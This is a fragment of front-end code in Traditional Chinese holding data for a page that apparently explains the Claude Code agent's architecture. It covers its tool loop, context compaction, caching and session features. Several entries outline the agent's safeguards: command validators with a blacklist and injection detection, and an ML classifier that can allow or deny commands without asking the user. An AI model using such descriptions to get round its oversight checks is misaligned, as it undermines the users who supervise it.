        { name: 'Snip 壓縮', desc: '先移除最舊的訊息，釋放空間（微壓縮）' },
        { name: '完整 Compaction', desc: '以 Claude 摘要對話歷史，保留關鍵資訊，清空舊訊息' },
      ],
      fallback: '若壓縮後仍超出，繼續嘗試更激進的壓縮策略'
    },
  ];

  decisions = [
    {
      icon: '🔄', question: 'API 回應包含 tool_use 嗎？',
      yes: '進入工具執行，結果加入對話，繼續 ReAct 循環（while true 繼續）',
      no: '任務完成，退出循環，渲染最終回應給使用者',
      ref: 'stop_reason: "tool_use" | "end_turn"'
    },
    {
      icon: '🔐', question: '工具需要使用者授權嗎？',
      yes: '顯示 PermissionRequest 對話框，等待 allow/deny',
      no: 'auto 模式或設定規則直接允許，不打斷工作流程',
      ref: 'canUseTool() → allow / ask / deny'
    },
    {
      icon: '📏', question: '對話歷史超過 Context 限制嗎？',
      yes: '觸發自動壓縮（Compact）：將舊訊息摘要，釋放空間',
      no: '維持完整對話歷史，直接組裝下一輪 API 請求',
      ref: 'maybeAutoCompact() · taskBudget.remaining'
    },
    {
      icon: '🔁', question: '工具是唯讀類型嗎？',
      yes: '與其他唯讀工具並發執行（最多 10 個同時）',
      no: '進入串行佇列，等待前一個工具完成後才執行',
      ref: 'partitionToolCalls() · isConcurrencySafe'
    },
    {
      icon: '🛡️', question: '指令通過 23 項安全驗證嗎？',
      yes: '繼續執行後續的權限確認流程',
      no: '立即拒絕，回報違反的安全規則（如黑名單、注入偵測）',
      ref: 'bashSecurity.ts validators[1..23]'
    },
    {
      icon: '🤖', question: 'ML 分類器在 2 秒內有高信心結果嗎？',
      yes: '直接允許或拒絕，不顯示使用者確認對話框',
      no: '超時或信心不足，顯示互動確認框等待使用者決定',
      ref: 'Promise.race([classifier, timeout(2000)])'
    },
  ];

  perfItems = [
    {
      icon: '💾', color: '#ffd166', title: 'Prompt Cache',
      desc: 'System Prompt 和工具定義標記 cache_control: ephemeral，同一 session 內重複使用快取，大幅降低 API 費用。',
      saving: '快取命中可省下 90% System Prompt Token 費用'
    },
    {
      icon: '⚡', color: '#00d4aa', title: '工具並發執行',
      desc: '唯讀工具同時執行最多 10 個，大幅縮短多工具任務的等待時間。',
      saving: '10 個並發 vs 串行：時間縮短最多 90%'
    },
    {
      icon: '🧠', color: '#7c5cfc', title: '上下文記憶化',
      desc: 'getSystemContext() 結果在 session 內記憶化，git status、CLAUDE.md 等只讀一次。',
      saving: '避免每次對話都重複執行 git / 檔案掃描'
    },
    {
      icon: '🌊', color: '#5c8aff', title: 'SSE 串流渲染',
      desc: '使用 Server-Sent Events，每個 token 到達即顯示，使用者不需等待完整回應才看到內容。',
      saving: '感知延遲從數秒縮短至毫秒級'
    },
    {
      icon: '🗜️', color: '#ff8c42', title: '自動訊息壓縮',
      desc: '對話接近 Context 上限時自動壓縮，讓長任務可以持續執行而不中斷。',
      saving: '支援數小時連續工作而不需重啟對話'
    },
    {
      icon: '🔋', color: '#ff4d6d', title: 'Session 持久化',
      desc: '每次對話即時儲存到 JSONL 檔案，中斷後可以 --resume 繼續，不損失進度。',
      saving: '意外中斷後可完整恢復，不損失任何工作'
    },
  ];
}
